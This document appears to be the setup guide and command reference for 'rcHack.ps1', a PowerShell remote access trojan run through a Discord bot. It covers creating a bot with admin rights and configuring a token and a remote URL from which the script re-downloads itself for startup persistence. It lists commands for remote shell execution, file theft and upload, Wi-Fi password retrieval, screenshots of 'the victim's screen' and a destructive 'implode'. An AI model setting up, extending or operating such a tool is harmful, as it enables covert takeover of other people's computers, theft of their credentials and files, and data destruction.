## How to Set Up the Discord Bot?

1. Go to [Discord Developer Portal](https://discord.com/developers/applications).
2. Click "New application," name it, and click "Create."
3. In the Bot tab, copy the bot token.
4. Under Privileged Gateway Intents, enable:
   - PRESENCE INTENT
   - SERVER MEMBERS INTENT
   - MESSAGE CONTENT INTENT
   Then click "Save Changes."
5. In the Oauth2 tab:
   - Under Redirects, type `http://localhost/`.
   - Enable the following:
     - `messages.read`
     - `applications.commands`
     - `bot`
   - Select redirect URL `http://localhost/` and add the
   - `admin` permission.
   - Copy the generated URL.
6. Open the copied URL in the browser and follow the steps to add the bot to your server.

Now the bot is set up. Update the `rcHack.ps1` file with the bot token and server ID.

# rcHack Discord Bot Setup

## Setup Instructions for rcHack.ps1

1. Open `rcHack.ps1` in a text editor.
2. Edit the following variables with your specific information:
   ```powershell
   $token = "YOUR_DISCORD_BOT_TOKEN_HERE"

   $guildId = "YOUR_DISCORD_SERVER_ID"

   $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"
   ```
the `StartupPsOnlineFileLocation` url should lead to an online-hosted version of itself (an exact copy)






```plaintext
COMMAND_NAME          | PARAMETERS
----------------------|-----------------------------------
If you see 'Requires admin.', that means the script wasn't run as administrator.

EXAMPLES

1. !cmd               | Executes a command in cmd and returns the output
   Example: !cmd ipconfig

2. !powershell        | Executes a command in PowerShell and returns the output
   Example: !powershell ipconfig

3. !dir               | Displays the current directory
   Example: !dir

4. !cd                | Changes the current directory
   Example: !cd C:\location\of\file

5. !download          | Downloads a file from a specified location or current directory
   Example: !download C:\location\of\file\file.txt
   Example: !download file.txt

6. !upload {ATTACHMENT}| Uploads any attachment to the current directory
   Example: !upload {ATTACHMENT}

7. !delete            | Deletes a specified file or directory
   Example: !delete C:\location\of\file\file.txt

8. !availwifi         | Retrieves available Wi-Fi networks
   Example: !availwifi

9. !wifipass          | Retrieves Wi-Fi passwords
   Example: !wifipass

10. !screenshot        | Captures a screenshot of the victim's screen
    Example: !screenshot

...

45. !startup           | Enables persistence for this script
        will add a ps1 script to startup
        on line 9, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
    Example: !startup

46. !implode           | Triggers a system implosion (Use with caution!)
    Example: !implode

47. !help              | Displays information about available commands
    Example: !help
```
